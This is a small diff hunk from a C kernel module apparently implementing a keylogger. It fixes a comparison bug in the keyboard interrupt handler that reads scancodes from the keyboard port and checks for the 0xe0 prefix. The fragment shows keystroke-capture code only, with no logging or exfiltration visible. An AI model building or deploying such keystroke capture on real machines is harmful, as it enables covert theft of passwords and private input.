@@ -79,7 +79,7 @@ static irqreturn_t keylogger_handle(int irq_n, void *data)
 	(void)logs;
 
 	scancode = inb(KB_PORT);
-	if (scancode = 0xe0)
+	if (scancode == 0xe0)
 	{
 		multicode = 1;
 		return IRQ_HANDLED;
